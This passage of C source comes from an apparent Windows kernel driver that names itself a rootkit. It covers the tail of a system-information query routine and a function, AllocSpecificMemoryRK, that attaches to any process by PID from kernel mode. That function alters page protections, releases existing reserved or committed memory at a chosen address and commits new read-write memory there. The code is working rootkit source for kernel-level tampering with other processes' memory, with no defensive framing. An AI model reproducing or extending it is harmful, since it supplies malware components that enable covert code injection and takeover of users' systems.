		else if (status == STATUS_INFO_LENGTH_MISMATCH || status == 0xC0000004 || status == -1073741820) {
			// Allocate memory -
			status = 0;
			ExFreePool(Buffer);
			Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, BufferSize, (ULONG)Flag);
			if (!Buffer) {
				DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST COULD NOT ALLOCATE MEMORY :(\n");
				SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_MEMALLOC;
				SysInfoRet.Buffer = NULL;
				return SysInfoRet;
			}

			// Query system information -
			status = ZwQuerySystemInformation(InfoType, Buffer, BufferSize, NULL);
			if (!NT_SUCCESS(status)) {
				DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH FAILED SYSTEM INFO QUERY :(\n");
				ExFreePool(Buffer);
				SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_QUERYVIRTMEM;
				SysInfoRet.Buffer = NULL;
				return SysInfoRet;
			}
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST SUCCEEDED AFTER STATUS_INFO_LENGTH_MISMATCH (INITIAL=%u,ACTUAL=%u)\n", InitBufferSize, BufferSize);

			SysInfoRet.BufferSize = BufferSize;
			SysInfoRet.Buffer = Buffer;
			return SysInfoRet;
		}

		else if (status == STATUS_ACCESS_VIOLATION || status == 0xC0000005 || status == -1073741819) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST MEMORY ACCESS VIOLATION (INITIAL) :(\n");
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_ACSVIO;
			ExFreePool(Buffer);
			return SysInfoRet;
		}

		else if (status == STATUS_NOT_SUPPORTED || status == 0xC00000BB || status == -1073741637) {
			DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH REQUEST STATUS NOT SUPPORTED (INITIAL) :(\n");
			SysInfoRet.Buffer = NULL;
			SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_NOTSUPPORTED;
			ExFreePool(Buffer);
			return SysInfoRet;
		}
		else {
			ExFreePool(Buffer);
			Buffer = NULL;
			InitBufferSize += BufferSizeInc;
		}
	}

	DbgPrintEx(0, 0, "KMDFdriver GET SYSTEM INFO LENGTH FAILED ALLOCATING A VALID BUFFER FOR INFO (SIZE>0XFFFF / DIFFERENT ERRORS FOR QUERY EVERY TRY) :(\n");
	SysInfoRet.BufferSize = (ULONG64)ROOTKSTATUS_OTHER;
	SysInfoRet.Buffer = NULL;
	return SysInfoRet;
}




NTSTATUS AllocSpecificMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST\n");

	PEPROCESS Process = { 0 };
	KAPC_STATE PrcState = { 0 };
	MEMORY_BASIC_INFORMATION mbi = { 0 };
	NTSTATUS status;

	PVOID InitialAddress = RootkInst->Buffer;
	ULONG64 RequestedSize = RootkInst->Size;
	ULONG_PTR ZeroBits = (ULONG_PTR)RootkInst->Reserved;
	SIZE_T AllocSize = ((RequestedSize / PAGE_SIZE) + 1) * PAGE_SIZE;
	PVOID AllocationAddress = NULL;
	BOOL ProtChanged = FALSE;

	// Check for invalid arguments -
	if (!InitialAddress || !RequestedSize) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - INVALID ARGS SIZE (%zu)/INITIAL ADDRESS (%p)\n", RequestedSize, InitialAddress);
		return ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Check for KM address (not allowed for this function) -
	if ((ULONG64)InitialAddress >= GetHighestUserModeAddrADD()) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - THE ADDRESS IS IN SYSTEMSPACE (%p)\n", InitialAddress);
		return ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_SYSTEMSPC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Process EPROCESS -
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - CANNOT GET EPROCESS (%hu) :(\n", RootkInst->MainPID);
		return ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCHANDLE, STATUS_UNSUCCESSFUL, RootkInst);
	}
	DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST SOURCE (%s, %hu)\n", RootkInst->MdlName, RootkInst->MainPID);


	KeStackAttachProcess(Process, &PrcState);  // attach to the process
	__try {
		ProbeForRead(InitialAddress, AllocSize, sizeof(UCHAR));
		status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
		
		if (!NT_SUCCESS(status)) {
			KeUnstackDetachProcess(&PrcState);  // detach from the process
			DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - CANNOT QUERY VIRTUAL MEMORY TO VERIFY STATE\n");
			return ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
		}
	}

	__except (STATUS_ACCESS_VIOLATION) {
		KeUnstackDetachProcess(&PrcState);  // detach from the process
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - VIRTMEM ADDRESS IS NOT IN THE ADDRESS RANGE/ITS NOT READABLE FOR VIRTMEMQUERY\n");
		return ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
	}

	// Notify on initial memory status -
	if (mbi.Protect & PAGE_NOACCESS) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST UPDATE - MEMORY RANGE IS INITIALLY PAGE_NOACCESS PROTECTED\n");
		ProtChanged = ChangeProtectionSettingsADD(ZwCurrentProcess(), InitialAddress, (ULONG)AllocSize, PAGE_READWRITE, mbi.Protect);
		if (ProtChanged) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST UPDATE - MEMORY RANGE SUCCESSFULLY CHANGED FROM PAGE_NOACCESS PROTECTED TO PAGE_READWRITE PROTECTED\n");
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST UPDATE - COULD NOT CHANGE PROTECTION FROM PAGE_NOACCESS PROTECTED (WILL PROB GIVE OUT ANOTHER MEMREGION)\n");
		}
	}

	// Set the initial allocation base for each memory state -
	if (mbi.State & MEM_FREE) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST UPDATE - MEMORY RANGE IS CURRENTLY FREE\n");
		AllocationAddress = InitialAddress;
	}

	else if (mbi.State & MEM_RESERVE) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST UPDATE - MEMORY RANGE IS CURRENTLY RESERVED\n");
		AllocationAddress = mbi.AllocationBase;

		// Verify region size -
		if (AllocSize > mbi.RegionSize) {
			DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST UPDATE - REQUESTED MEMORY SIZE (%zu) > AVAILABLE REGION (%zu), TRYING TO RELEASE AND REQUERY..\n", AllocSize, mbi.RegionSize);
			status = ZwFreeVirtualMemory(ZwCurrentProcess(), &mbi.AllocationBase, &mbi.RegionSize, MEM_RELEASE);
			if (!NT_SUCCESS(status)) {
				KeUnstackDetachProcess(&PrcState);  // detach from the process
				DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - CANNOT FREE ALREADY RESERVED UNMATCHING MEMORY\n");
				return ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
			}

			status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
			if (!NT_SUCCESS(status)) {
				KeUnstackDetachProcess(&PrcState);  // detach from the process
				DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - CANNOT QUERY VIRTUAL MEMORY TO VERIFY STATE AFTER RELEASING ALREADY RESERVED UNMATCHING MEMORY\n");
				return ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
			}

			AllocationAddress = InitialAddress;
			DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST UPDATE - FREED ALREADY RESERVED UNMATCHING MEMORY\n");
		}
	}

	else {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST UPDATE - MEMORY RANGE IS CURRENTLY COMMITTED, TRYING TO FREE EXISTING COMMITTING..\n");
		status = ZwFreeVirtualMemory(ZwCurrentProcess(), &mbi.AllocationBase, &mbi.RegionSize, MEM_RELEASE);
		if (!NT_SUCCESS(status)) {
			KeUnstackDetachProcess(&PrcState);  // detach from the process
			DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - CANNOT FREE ALREADY COMMITTED MEMORY\n");
			return ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
		}

		status = ZwQueryVirtualMemory(ZwCurrentProcess(), InitialAddress, MemoryBasicInformation, &mbi, sizeof(mbi), NULL);
		if (!NT_SUCCESS(status)) {
			KeUnstackDetachProcess(&PrcState);  // detach from the process
			DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - CANNOT QUERY VIRTUAL MEMORY TO VERIFY STATE AFTER RELEASING ALREADY COMMITTED MEMORY\n");
			return ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
		}

		AllocationAddress = InitialAddress;
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST UPDATE - FREED ALREADY COMMITTED MEMORY\n");
	}
	DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST UPDATE - ALIGNED INITIAL ADDRESS FROM %p TO %p\n", InitialAddress, AllocationAddress);


	// Verify region size -
	if (AllocSize > mbi.RegionSize) {
		KeUnstackDetachProcess(&PrcState);  // detach from the process
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - REQUESTED MEMORY SIZE (%zu) > AVAILABLE REGION (%zu)\n", AllocSize, mbi.RegionSize);
		return ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Allocate the actual memory -
	AllocationAddress = CommitMemoryRegionsADD(ZwCurrentProcess(), AllocationAddress, AllocSize, PAGE_READWRITE, NULL, ZeroBits);
	KeUnstackDetachProcess(&PrcState);  // detach from the process
	if (AllocationAddress == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST FAILED - COMMITTING FAILED\n");
		return ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
	}

	DbgPrintEx(0, 0, "KMDFdriver CALLING MALLOCATE SPECIFIC REQUEST SUCCESS (RANGE ALLIGNED TO %p)\n", AllocationAddress);
	RootkInst->Out = AllocationAddress;
	return ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}